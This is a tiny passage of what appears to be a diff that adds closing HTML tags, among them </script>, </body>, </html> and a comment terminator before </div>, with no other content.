+</script>
+</body>
+</html>
+--></div>
+</body>
+</html>
